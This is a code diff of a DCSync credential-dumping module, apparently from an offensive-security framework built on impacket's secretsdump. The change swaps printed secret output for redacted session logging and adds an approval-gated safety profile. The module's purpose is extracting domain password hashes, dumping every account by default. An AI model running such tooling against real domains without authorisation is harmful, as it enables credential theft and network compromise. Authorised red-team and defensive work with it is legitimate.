@@ -6,16 +6,18 @@ import contextlib
 import json
 from typing import Any
 
-from rich.console import Console
-
 from adaf_attack.core.graph import AttackGraph
 from adaf_attack.core.impacket_helper import require_impacket
 from adaf_attack.core.redaction import redact
-from adaf_attack.core.registry import register_capability
+from adaf_attack.core.registry import (
+    ApprovalPolicy,
+    RiskLevel,
+    RollbackClass,
+    SafetyProfile,
+    register_capability,
+)
 from adaf_attack.core.session import Session
 from adaf_attack.core.target import Target
-
-console = Console()
 
 
 @register_capability(
@@ -23,7 +25,13 @@ console = Console()
     summary="Replicate NT/LM/aes secrets via MS-DRSR (DCSync)",
     category="credential-access",
     tags=("dcsync", "drsuapi", "replication", "secretsdump"),
-    destructive=False,
+    safety=SafetyProfile(
+        risk=RiskLevel.SIDE_EFFECT,
+        approval=ApprovalPolicy.FORCE_AND_ACK,
+        rollback=RollbackClass.NONE,
+        network_side_effect=True,
+        exposes_credentials=True,
+    ),
 )
 class Dcsync:
     def run(
@@ -60,9 +68,11 @@ class Dcsync:
                 principals = [str(principals_source)]
         # empty principals = full dump
 
-        console.print(
-            f"[bold]DCSync[/bold] → {target.domain} @ {target.dc_ip}  "
-            f"targets={len(principals) or 'all'}  history={history}"
+        session.log(
+            "dcsync.start",
+            target=target.dc_ip,
+            principal_count=len(principals),
+            history=history,
         )
 
         from impacket.examples.secretsdump import (
@@ -99,7 +109,6 @@ class Dcsync:
         def _collect(secret_type: int, secret: Any) -> None:
             text = str(secret)
             collected.append({"raw": text, "type": secret_type})
-            console.print(f"  [green]dc[/green] {text[:120]}")
 
         no_lm = False
         try:
@@ -158,5 +167,4 @@ class Dcsync:
             count=len(parsed),
             include_secrets=include_secrets,
         )
-        console.print(f"[green]Done[/green]  entries={len(parsed)}")
         return dict(redacted) if isinstance(redacted, dict) else result
